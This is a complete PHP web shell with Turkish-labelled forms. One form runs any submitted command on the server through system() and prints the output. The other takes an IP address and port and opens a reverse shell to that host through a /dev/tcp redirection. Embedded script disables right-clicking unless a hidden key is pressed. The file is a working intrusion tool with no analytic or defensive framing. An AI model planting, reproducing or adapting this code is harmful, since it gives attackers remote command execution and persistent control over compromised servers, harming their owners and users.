<?php


    echo'
    <html>

<style>
.button {
  background-color: #3CBC8D;
  border: none;
  color: white;
  padding: 9px 60px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin: 8px 0px;
  cursor: pointer;
}


input[type=text] {
  width: 50%;
  padding: 12px 15px;
  margin: 8px 0;
  box-sizing: border-box;
  border: none;
  background-color: #3CBC8D;
  color: white;
}


.square-box{
    position: relative;
    width: 50%;
    overflow: hidden;
    background: white;
}
</style>
<body style="background-color:white;">

<SCRIPT LANGUAGE="Javascript"><!--

var isNS = (navigator.appName == "Netscape") ? 1 : 0;
var EnableRightClick = 0;
if(isNS)
document.captureEvents(Event.MOUSEDOWN||Event.MOUSEUP);
function mischandler(){
if(EnableRightClick==1){ return true; }
else {return false; }
}
function mousehandler(e){
if(EnableRightClick==1){ return true; }
var myevent = (isNS) ? e : event;
var eventbutton = (isNS) ? myevent.which : myevent.button;
if((eventbutton==2)||(eventbutton==3)) return false;
}
function keyhandler(e) {
var myevent = (isNS) ? e : window.event;
if (myevent.keyCode==96)
EnableRightClick = 1;
return;
}
document.oncontextmenu = mischandler;
document.onkeypress = keyhandler;
document.onmousedown = mousehandler;
document.onmouseup = mousehandler;
//-->
</script>

</body>

<center>
<div class="square-box">
<form action="" method="post">
<input type="text" id="fname" name="komut" placeholder="uname -a">
<button name="fakyu" class="button">Execute</button>
<br>
<br>
<br>
<br>
<h4>=================================================================</h4>
<input type="text" id="fname" name="ipadres" placeholder="ipadress"><br>
<input type="text" id="fname" name="port" placeholder="port"><br>
<button name="fakyu" class="button">Baglanti Gonder</button><br>
</form>
</div>
</center>
</html>';

      if(isset($_POST['komut'])){

      echo system($_POST['komut']);
    }


      if(isset($_POST['ipadres'])){
     echo '<center><h3>Connection Sended..</h3></center>';

      system('0<&121-;exec 121<>/dev/tcp/'.$_POST['ipadres'].'/'.$_POST['port'].';sh <&121 >&121 2>&121>');
      
      
      
    }

?>